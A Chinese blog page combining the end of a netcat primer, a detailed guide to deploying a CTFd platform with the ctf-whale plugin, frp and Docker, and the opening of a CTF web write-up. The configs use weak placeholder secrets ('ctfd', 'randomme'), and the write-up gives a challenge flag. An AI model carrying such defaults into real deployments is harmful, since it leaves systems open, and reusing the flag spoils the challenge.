usage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]
	  [-s source_ip_address] [-w timeout] [-X proxy_version]
	  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre>

<p>出现了类似上面的输出，说明运行成功了。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p>
<p>我们可以使用 nc，尝试一次与网页服务器的连接，以百度为例。</p>
<p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p>
<p>输入 GET / HTTP/1.0。这表示，我们使用 HTTP/1.0 这个协议版本，用 GET 的方式请求根 /。输入<strong>两下</strong>回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！<br>2366</p>
<h6 id="内容可能不同，返回类似即表示成功"><a href="#内容可能不同，返回类似即表示成功" class="headerlink" title="内容可能不同，返回类似即表示成功"></a>内容可能不同，返回类似即表示成功</h6><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p>
<hr>
<p>end</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/Netcat/" data-id="cklc0zh1l000mfpov4rkiblha" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/netcat/" rel="tag">netcat</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.17" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/CTFD/" class="article-date">
  <time datetime="2020-10-17T09:49:25.000Z" itemprop="datePublished">2020-10-17</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/">杂谈笔记</a>►<a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/">菜鸡教程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/CTFD/">CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.16</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）2020-10-17"><a href="#CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）2020-10-17" class="headerlink" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.17"></a>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.17</h1><h2 id="本篇文章最后更新于2020-10-17"><a href="#本篇文章最后更新于2020-10-17" class="headerlink" title="本篇文章最后更新于2020.10.17"></a>本篇文章最后更新于2020.10.17</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfd可以说是如今最方便的ctf靶场搭建平台，支持各种插件与二次开发，<a target="_blank" rel="noopener" href="https://www.zhaoj.in/">赵师傅</a>早前写了一款插件ctf-whale非常方便，但本人在搭建的过程中遇到了不少问题，经过不断研究终于完成，特此记录，以防后期忘记，也供大家交流学习。<br>赵师傅开发的插件是为了适合 <a target="_blank" rel="noopener" href="https://buuoj.cn/">buu</a> 的架构,本篇文章采用完整流程+填坑讲解的格式。</p>
<h4 id="强调！"><a href="#强调！" class="headerlink" title="强调！"></a>强调！</h4><p>由于国内git clone实在太慢，本人采用的方法是科学上网下载zip解压的方式，可自行百度git clong与Download zip的区别。本篇文章是用本地下载zip解压上传的方式完成<strong>在服务器上</strong>搭建</p>
<p>如果阅读中操作出现问题请自行百度，翻到文末查看坑点讲解或者查看其它搭建文章</p>
<p>这里感谢赵师傅zhaoj，fjh1997等前辈写的文章指导，读者遇到问题或有不足或缺陷的地方请私信我添加改正</p>
<h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p><strong>注意</strong>：本机为CentOS7<br>要求：</p>
<ol>
<li>已安装基础环境，熟悉linux基本操作</li>
<li>已安装好 Docker 和 Docker-Compose，并且启用 Docker Swarm，完成换源等操作</li>
<li>会<em>科学上网</em></li>
<li>有绝对的耐心</li>
</ol>
<p>需求：</p>
<ol>
<li>下载赵师傅改写的ctfd，赵师傅已经完成了镜像换源等操作</li>
</ol>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd.git -&gt;赵师傅仓库</code></pre>

<ol start="2">
<li>下载frp</li>
</ol>
<pre class="language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gz

tar -zxvf frp_0.29.0_linux_amd64.tar.gz</code></pre>
<p>也可以直接访问链接下载然后解压上传</p>
<ol start="3">
<li>下载ctf-whale</li>
</ol>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale</code></pre>

<ol start="4">
<li>下载docker的frps<br>这里在赵师傅仓库里扒拉发现的<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;Frp-Docker-For-CTFd-Whale</code></pre>

</li>
</ol>
<p>以上除ctfd解压后请确保字母小写，并只有一级文件夹</p>
<hr>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-docker集群设置"><a href="#1-docker集群设置" class="headerlink" title="1.docker集群设置"></a>1.docker集群设置</h3><p>输入命令</p>
<pre class="language-none"><code class="language-none">docker swarm init

docker node ls

docker node update --label-add name&#x3D;linux-1 &lt;节点 ID&gt;</code></pre>

<img src="/article/CTFD/20201017233032375.png" class="" title="docker集群设置">

<p>具体原理等可以查看其它ctfd搭建文章，文末会贴出，这里不做过多阐述</p>
<h3 id="2-放入ctfd-whale"><a href="#2-放入ctfd-whale" class="headerlink" title="2.放入ctfd-whale"></a>2.放入ctfd-whale</h3><p>将解压的ctfd-whale改小写后放入/CTFd/CTFd/plugins</p>
<h3 id="3-安装frps（这里有其他教程写的是不对的）"><a href="#3-安装frps（这里有其他教程写的是不对的）" class="headerlink" title="3.安装frps（这里有其他教程写的是不对的）"></a>3.安装frps（这里有其他教程写的是不对的）</h3><p>这里注意下，frp<strong>不是</strong>装在服务器机子上的，简单来说，frps与frpc都是在docker里的。（大坑在这里）<br>frpc是在ctfd里的，frps是在docker机里的</p>
<p>上传赵师傅的Frp-Docker-For-CTFd-Whale，进入目录后运行<code>docker-compose up -d</code>即可，然后<code>docker ps</code>可看到frps的容器运行中</p>
<img src="/article/CTFD/202010172331132.png" class="" title="frps">

<p>这里看到frps有28000-28100，这是在<strong>Frp-Docker-For-CTFd-Whale里的docker-compose.yml</strong>，可更改配置后compose</p>
<pre class="language-none"><code class="language-none">version: &#39;2&#39;

services:
  frps:
    image: glzjin&#x2F;frp:latest
    restart: always
    volumes:
      - .&#x2F;frp:&#x2F;conf&#x2F;
    entrypoint:
        - &#x2F;usr&#x2F;local&#x2F;bin&#x2F;frps
        - -c
        - &#x2F;conf&#x2F;frps.ini
    ports:
      - &quot;28000-28100:28000-28100&quot;     #可更改开放端口
      - &quot;6490:6490&quot;    #此处必须与frps.ini配置一致
    networks:
        default:

networks:
    default:
</code></pre>

<p>再看一下/frp/frps.ini</p>
<pre class="language-none"><code class="language-none">[common]
bind_port &#x3D; 6490
token &#x3D; randomme</code></pre>


<h3 id="4-配置ctfd"><a href="#4-配置ctfd" class="headerlink" title="4.配置ctfd"></a>4.配置ctfd</h3><p>直接上<strong>ctfd的docker-compose.yml</strong>配置</p>
<pre class="language-none"><code class="language-none">version: &#39;2.2&#39;

services:
  ctfd-nginx:
    image: nginx:1.17
    volumes:
      - .&#x2F;nginx&#x2F;http.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf   #这里注意
    user: root
    restart: always
    ports:
      #- &quot;85:80&quot;     #我将这里注释掉了，这里通过nginx转发感觉速度访问速度会变慢，多次尝试之后直接开8000端口访问不会对服务造成影响
      - &quot;443:443&quot;
    networks:
        default:
        internal:
    depends_on:
      - ctfd
    cpus: &#39;1.00&#39;  #可改
    mem_limit: 150M     #可改
  ctfd:
    build: .
    user: root
    restart: always
    ports:
      - &quot;8000:8000&quot;     #这里原本没开端口，直接打开访问网站速度会加快
    environment:
      - UPLOAD_FOLDER&#x3D;&#x2F;var&#x2F;uploads
      - DATABASE_URL&#x3D;mysql+pymysql:&#x2F;&#x2F;root:ctfd@db&#x2F;ctfd
      - REDIS_URL&#x3D;redis:&#x2F;&#x2F;cache:6379
      - WORKERS&#x3D;1
      - LOG_FOLDER&#x3D;&#x2F;var&#x2F;log&#x2F;CTFd
      - ACCESS_LOG&#x3D;-
      - ERROR_LOG&#x3D;-
      - REVERSE_PROXY&#x3D;true
    volumes:
      - .data&#x2F;CTFd&#x2F;logs:&#x2F;var&#x2F;log&#x2F;CTFd
      - .data&#x2F;CTFd&#x2F;uploads:&#x2F;var&#x2F;uploads
      - .:&#x2F;opt&#x2F;CTFd:ro
      - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock     #这里是添加的
    depends_on:
      - db
    networks:
        default:
        internal:
        frp:
            ipv4_address: 172.1.0.2
    cpus: &#39;1.00&#39;     #可改
    mem_limit: 450M     #可改

  db:
    image: mariadb:10.4
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD&#x3D;ctfd
      - MYSQL_USER&#x3D;ctfd
      - MYSQL_PASSWORD&#x3D;ctfd
    volumes:
      - .data&#x2F;mysql:&#x2F;var&#x2F;lib&#x2F;mysql
    networks:
        internal:
    # This command is required to set important mariadb defaults
    command: [mysqld, --character-set-server&#x3D;utf8mb4, --collation-server&#x3D;utf8mb4_unicode_ci, --wait_timeout&#x3D;28800, --log-warnings&#x3D;0]
    cpus: &#39;1.00&#39;     #可改
    mem_limit: 750M     #可改

  cache:
    image: redis:4
    restart: always
    volumes:
      - .data&#x2F;redis:&#x2F;data
    networks:
        internal:
    cpus: &#39;1.00&#39;     #可改
    mem_limit: 450M     #可改

  frpc:    
    image: glzjin&#x2F;frp:latest     #赵师傅tql
    restart: always
    volumes:
      - .&#x2F;frpc:&#x2F;conf&#x2F;     #这里注意
    entrypoint:
        - &#x2F;usr&#x2F;local&#x2F;bin&#x2F;frpc
        - -c
        - &#x2F;conf&#x2F;frpc.ini
    networks:
        frp:
            ipv4_address: 172.1.0.3  #记住此处
        frp-containers:
    cpus: &#39;1.00&#39;     #可改
    mem_limit: 250M     #可改

networks:
    default:
    internal:
        internal: true
    frp:
        driver: bridge
        ipam:
            config:
                - subnet: 172.1.0.0&#x2F;16
    frp-containers:
        driver: overlay
        internal: true
        ipam:
            config:
                - subnet: 172.2.0.0&#x2F;16
</code></pre>


<p>然后<strong>注意！注意！注意！</strong></p>
<p>在docker-compose.yml同目录下建nginx文件夹，即与第一个#这里注意相应，然后建<code>http.conf</code>文件写入以下内容</p>
<pre class="language-none"><code class="language-none">worker_processes 4;
events &#123;
  worker_connections 1024;
&#125;
http &#123;
  # Configuration containing list of application servers
  upstream app_servers &#123;
    server ctfd:8000;
  &#125;
  server &#123;
    listen 80;
    client_max_body_size 4G;
    # Handle Server Sent Events for Notifications
    location &#x2F;events &#123;
      proxy_pass http:&#x2F;&#x2F;app_servers;
      proxy_set_header Connection &#39;&#39;;
      proxy_http_version 1.1;
      chunked_transfer_encoding off;
      proxy_buffering off;
      proxy_cache off;
      proxy_redirect off;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Host $server_name;
    &#125;
    # Proxy connections to the application servers
    location &#x2F; &#123;
      proxy_pass http:&#x2F;&#x2F;app_servers;
      proxy_redirect off;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Host $server_name;
    &#125;
  &#125;
&#125;
</code></pre>



<p>在docker-compose.yml同目录下建frpc文件夹，即与第二个#这里注意相应，然后进入解压的/frp_0.29.0_linux_amd64文件夹，或直接上传，将</p>
<pre class="language-none"><code class="language-none">frpc
frpc.ini
frpc_full.ini
LICENSE
</code></pre>


<p>放入frpc文件夹<br>接着配置frpc.ini，直接上配置</p>
<pre class="language-none"><code class="language-none">[common]
token &#x3D; randomme
server_addr &#x3D; 172.1.0.4
server_port &#x3D; 6490     #此处必须与frpc.ini配置一致
pool_count &#x3D; 200
tls_enable &#x3D; true

admin_addr &#x3D; 172.1.0.3 #一定要加！！与后面相应
admin_port &#x3D; 7400
</code></pre>

<p>此处非常重要，之前本人在这里踩了好多次坑。</p>
<h3 id="5-配置Dockerfile"><a href="#5-配置Dockerfile" class="headerlink" title="5.配置Dockerfile"></a>5.配置Dockerfile</h3><p>还是直接上配置，<strong>Dockerfile</strong></p>
<pre class="language-none"><code class="language-none">FROM python:3.7-alpine  #如果出现问题可尝试更换python，一般不需要
RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories &amp;&amp; \
    apk update &amp;&amp; \
    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   #这里注意1
RUN adduser -D -u 1001 -s &#x2F;bin&#x2F;bash ctfd

WORKDIR &#x2F;opt&#x2F;CTFd
RUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploads

COPY requirements.txt .

RUN pip install -r requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F;   #这里注意2

COPY . &#x2F;opt&#x2F;CTFd

RUN for d in CTFd&#x2F;plugins&#x2F;*; do \
      if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \
        pip install -r $d&#x2F;requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F; ; \
      fi; \
    done;

RUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh
RUN chown -R 1001:1001 &#x2F;opt&#x2F;CTFd
RUN chown -R 1001:1001 &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploads

USER 1001
EXPOSE 8000
ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]
</code></pre>

<p>注意点：</p>
<ol>
<li>第一处的镜像源可百度更换其它源，例如</li>
</ol>
<p><code>sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&#39; /etc/apk/repositories</code><br>注意如果出现问题检查下最后有没有<code>&amp;&amp; \</code></p>
<ol start="2">
<li>python版本一般不需要换</li>
<li>RUN第三行我将python和python-dev删掉了，如果要加上则会报错<code>python requires by world</code>之类的，请加上<code>python2</code>或<code>python3</code>，<code>python2-dev</code>或<code>python3-dev</code>.即可解决。删掉后没有发现对服务有什么影响</li>
<li>所有<code>-i &quot;url&quot;</code>都是指定源，如果下载失败则可更换源再试</li>
<li>第二处注意即我更换了源，因为之前看其他教程下载失败了</li>
</ol>
<h3 id="6-准备完毕"><a href="#6-准备完毕" class="headerlink" title="6.准备完毕"></a>6.准备完毕</h3><p>运行<code>docker-compose build</code><br>静待完成</p>
<img src="/article/CTFD/20201017233234439.png" class="" title="build">


<p>然后运行<code>docker-compose up -d</code></p>
<img src="/article/CTFD/20201017233300241.png" class="" title="up">


<p>如图所示，有WARNING即为在集群网络类，是正常情况<br>运行<code>docker ps</code>查看容器情况</p>
<img src="/article/CTFD/20201017233329640.png" class="" title="ps">


<p>访问 <a target="_blank" rel="noopener" href="http://ip:8000/">http://ip:8000</a> 即可访问ctfd</p>
<h3 id="配置CTFD"><a href="#配置CTFD" class="headerlink" title="配置CTFD"></a>配置CTFD</h3><p>进入后随便设置，然后进Admin Panel进行设置</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>配置</th>
</tr>
</thead>
<tbody><tr>
<td>Docker API URL</td>
<td>unix://var/run/docker.sock</td>
</tr>
<tr>
<td>Frp API IP</td>
<td>frpc的ip配置</td>
</tr>
<tr>
<td>Frp API Port</td>
<td>frpc的端口配置</td>
</tr>
<tr>
<td>Frp Http Domain Suffix</td>
<td>Docker API URL to connect（可填None）</td>
</tr>
<tr>
<td>Frp Http Port</td>
<td>80</td>
</tr>
<tr>
<td>Frp Direct IP Address</td>
<td>你的公网ip，本机即为127.0.0.1</td>
</tr>
<tr>
<td>Frp Direct Minimum Port</td>
<td>与之前frps最小端口呼应</td>
</tr>
<tr>
<td>Frp Direct Minimum Port</td>
<td>与之前frps最大端口呼应</td>
</tr>
<tr>
<td>Max Container Count</td>
<td>不超过最大-最小</td>
</tr>
<tr>
<td>Max Renewal Times</td>
<td>最大实例延时次数</td>
</tr>
<tr>
<td>Frp config template</td>
<td>填入frps的配置，只需填[common]</td>
</tr>
<tr>
<td>Docker Auto Connect Containers</td>
<td>ctfd_frpc_1</td>
</tr>
<tr>
<td>Docker Dns Setting</td>
<td>可填机器内DNS，没有可填个外网DNS</td>
</tr>
<tr>
<td>Docker Swarm Nodes</td>
<td>linux-1   与前面swarm集群呼应</td>
</tr>
<tr>
<td>Docker Multi-Container Network Subnet</td>
<td>内网题大子网ip配置/CIDR</td>
</tr>
<tr>
<td>Docker Multi-Container Network Subnet New Prefix</td>
<td>每个内网题实例的CIDR</td>
</tr>
<tr>
<td>Docker Container Timeout</td>
<td>单位为秒</td>
</tr>
</tbody></table>
<p>最后附上我的配置图片</p>
<img src="/article/CTFD/20201017233350699.png" class="" title="配置1">

<img src="/article/CTFD/20201017233413853.png" class="" title="配置2">

<img src="/article/CTFD/20201017233431163.png" class="" title="配置3">


<h3 id="设置docker网络"><a href="#设置docker网络" class="headerlink" title="设置docker网络"></a>设置docker网络</h3><p>这个时候运行<code>docker ps</code><br>发现frpc在无限重启，因为我们还没有配置网络<br>运行<code>docker network ls</code></p>
<img src="/article/CTFD/20201017234359215.png" class="" title="容器">


<p>显示ctfd_frp-containers</p>
<p>运行<code>docker network inspect ctfd_frp</code></p>
<img src="/article/CTFD/20201017234428683.png" class="" title="ctfd_frp">


<p>这个是docker-compose里compose后创建的网络，我们将frps加入此网络，例如我的frp容器id为12345，则运行<code>docker network connect ctfd_frp 12345&lt;即frp容器id&gt;</code>。再运行<code>docker network inspect ctfd_frp</code>，如下<img src="/article/CTFD/20201017234344822.png" class="" title="在这里插入图片描述"></p>
<p>这里可以看到ip与我们之前设置的相应。</p>
<p>此时运行<code>docker restart ctfd_frpc_1 frp_frps_1</code></p>
<p>然后<code>docker ps</code></p>
<p>最终如下<img src="/article/CTFD/20201017234457228.png" class="" title="ps"></p>
<p>成功完成。</p>
<p>最后设置道题目选择（我做了汉化）</p>
<img src="/article/CTFD/20201017233701655.png" class="" title="题目1">


<img src="/article/CTFD/20201017233922648.png" class="" title="题目2">

<img src="/article/CTFD/20201017234241273.png" class="" title="在这里插入图片描述">

<p><code>docker ps</code>里可以看到容器成功启动，地址正常访问</p>
<h3 id="坑点注意"><a href="#坑点注意" class="headerlink" title="坑点注意"></a>坑点注意</h3><ol>
<li>如果frpc重复出现retrying，请返回检查docker-compose.yml。找到frpc设置，检查ip设置是否正确。再检查ctfd的Admin Panel里ctfd-whale设置是否正确。</li>
<li>如果出现安装某个文件失败问题，请更换源，很多都是源里没有指定文件造成的。可以自行访问一下网站，查看一下要下载的文件名，再进行配置。</li>
<li>似乎docker和系统的版本会有影响，本机为CentOS7.4 64位，腾讯云，docker配置如下</li>
</ol>
<img src="/article/CTFD/20201017234315447.png" class="" title="版本">


<ol start="4">
<li><p>python的问题，上面提到的，可以删除，是因为没有指定版本的原因，也可以指定版本再下载</p>
</li>
<li><p>ctfd运行<code>docker-compose up -d</code>后有可能提示docker-entrypoint.sh没有权限，手动加个权限即可。在CTFd文件夹下运行<code>chmod a+x docker-entrypoint.sh</code>（docker-compose.yml里其实写了加权限，但是最后并没有加上去？）</p>
</li>
<li><p>如果docker容器无法启动或者frp端口无法映射可以进容器检查 </p>
<p>确保docker api填写正确，如docker-compose.yml中写的unix:///var/run/docker.sock<br>你也可以使用端口形式的api如<a target="_blank" rel="noopener" href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd">官方示例</a>：可以用IP：端口指定API</p>
<h6 id="docker容器无法启动问题"><a href="#docker容器无法启动问题" class="headerlink" title="docker容器无法启动问题"></a>docker容器无法启动问题</h6><p>进入容器检查：</p>
<pre class="language-none"><code class="language-none">docker exec -it &lt;ctfd容器id&gt; sh
&#x2F;opt&#x2F;CTFd# python
&gt;&gt;&gt;import docker
&gt;&gt;&gt;client&#x3D;docker.DockerClient(base_url&#x3D;&quot;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock&quot;)
&gt;&gt;&gt;client.images.list()</code></pre>

<p> 如果api正确会列出所有镜像 </p>
<h6 id="frp端口无法映射问题"><a href="#frp端口无法映射问题" class="headerlink" title="frp端口无法映射问题"></a>frp端口无法映射问题</h6><p>进入容器检查：</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;其实检查可以顺便检查一下上面的，因为都在ctfd容器内
docker exec -it &lt;ctfd容器id&gt; sh
&#x2F;opt&#x2F;CTFd# python
&gt;&gt;&gt;import requests
&gt;&gt;&gt;requests.get(&quot;http:&#x2F;&#x2F;172.1.0.3:7400&#x2F;api&#x2F;reload&quot;)&#x2F;&#x2F;即frp api的地址

返回
&lt;Response [200]&gt; #表示成功</code></pre>

<p>如果frpc还是出现如下问题</p>
<pre class="language-none"><code class="language-none">requests.exceptions.ConnectionError: HTTPConnectionPool(host&#x3D;&#39;172.1.0.3&#39;, port&#x3D;7400): Max retries exceeded with url: &#x2F;api&#x2F;reload (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f8df919f850&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;))
</code></pre>

<p>则重新配置frpc。编辑/CTFd/frpc/frpc.ini</p>
<pre class="language-none"><code class="language-none">[common]
token &#x3D; randomme
server_addr &#x3D; 172.1.0.4
server_port &#x3D; 6490
pool_count &#x3D; 200
tls_enable &#x3D; true

admin_addr &#x3D; 172.1.0.3 #这里千万千万别忘加，之前要被搞气死
admin_port &#x3D; 7400</code></pre>

<p>然后运行<code>docker restart ctfd_frpc_1</code>（这里再看frpc.ini会发现内容更新了，admin配置没了，不用担心）</p>
<p>再进容器检查<code>requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)</code>应该就可以了<code>&lt;Response [200]&gt;</code></p>
</li>
</ol>
<ol start="7">
<li><p>遇事不决请重启</p>
</li>
<li><p>如果发现frp端口冲突，请检查本地frpc或者frps服务，frp是在docker上<strong>不是在本地</strong>的！</p>
<pre class="language-none"><code class="language-none">systemctl stop frpc
systemctl stop frps</code></pre>



</li>
</ol>
<ol start="9">
<li><p>活用查看log</p>
<pre class="language-none"><code class="language-none">docker logs &lt;ctfd容器id&gt;
docker logs &lt;frp容器id&gt;</code></pre>
</li>
<li><p>如果修改了任意配置，请跟着修改<strong>系列配置</strong>，很多就是因为漏改造成的</p>
</li>
</ol>
<p>11.docker ps显示正常但是无法访问</p>
<p> 可以使用 <code>docker logs ctfd_ctfd_1</code> 查看输出，如果发现输出类似： </p>
<pre class="language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;tzlocal&#x2F;unix.py:158: UserWarning: Can not find any timezone configuration, defaulting to UTC.
  warnings.warn(&#39;Can not find any timezone configuration, defaulting to UTC.&#39;)
Starting CTFd
&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject
  return f(*args, **kwds)
&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject
  return f(*args, **kwds)
&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject
  return f(*args, **kwds)
[2020-10-11 12:31:30 +0000] [1] [INFO] Starting gunicorn 19.9.0
[2020-10-11 12:31:30 +0000] [1] [INFO] Listening at: http:&#x2F;&#x2F;0.0.0.0:8000 (1)
[2020-10-11 12:31:30 +0000] [1] [INFO] Using worker: gevent
[2020-10-11 12:31:30 +0000] [21] [INFO] Booting worker with pid: 21
[2020-10-11 12:31:31 +0000] [23] [INFO] Booting worker with pid: 23
[2020-10-11 12:31:32 +0000] [25] [INFO] Booting worker with pid: 25
[2020-10-11 12:31:34 +0000] [27] [INFO] Booting worker with pid: 27
[2020-10-11 12:31:35 +0000] [29] [INFO] Booting worker with pid: 29
[2020-10-11 12:31:36 +0000] [31] [INFO] Booting worker with pid: 31
[2020-10-11 12:31:37 +0000] [33] [INFO] Booting worker with pid: 33
[2020-10-11 12:31:39 +0000] [35] [INFO] Booting worker with pid: 35
[2020-10-11 12:31:40 +0000] [37] [INFO] Booting worker with pid: 37(一直在加)
</code></pre>

<p> 则问题为<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/64105616/greenlet-runtime-error-and-deployed-app-in-docker-keeps-booting-all-the-workers">这篇文章中所提到的问题</a>，只需要删除 <code>requirements.txt</code> 中的 <code>gevent</code> 版本号即可，结果类似下面这样 </p>
<pre class="language-none"><code class="language-none">&#x2F;requirements.txt
...
redis&#x3D;&#x3D;3.3.11
datafreeze&#x3D;&#x3D;0.1.0
gevent
python-dotenv&#x3D;&#x3D;0.10.3
flask-restplus&#x3D;&#x3D;0.13.0
...</code></pre>

<p> 然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题 </p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p> <a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a>(赵师傅官方)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/100850756/">手把手教你如何建立一个支持ctf动态独立靶机的靶场（ctfd+ctfd-whale）</a></p>
<p> <a target="_blank" rel="noopener" href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">ctfd使用ctfd-whale动态靶机插件搭建靶场指南</a></p>
<p>如果有问题请私信联系我，不足之处敬请谅解</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/CTFD/" data-id="cklc0zh1k000ffpov06bd9a5c" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-whale/" rel="tag">ctf-whale</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctfd/" rel="tag">ctfd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Asuri_ctf WEB Write-up" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/Asuri_ctf-WEB-Write-up/" class="article-date">
  <time datetime="2020-10-12T08:58:25.000Z" itemprop="datePublished">2020-10-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/Asuri_ctf-WEB-Write-up/">Asuri_ctf WEB Write-up</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>by:gyy</p>
<h2>[nuaactf2019]web签到</h2>
<h3>F12</h3>
题目地址：<a class="url" href="http://106.15.177.94:10001/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10001/</a>

<p>f12直接看源码</p>
<h3>最终</h3>
问题解决：nuaactf{we1cOme_to_NuaAcTF}

<hr />
<h2>神奇的php</h2>
<h3>代码审计</h3>
题目地址：<a class="url" href="http://106.15.177.94:10017/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10017/</a>

<p>打开直接给源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
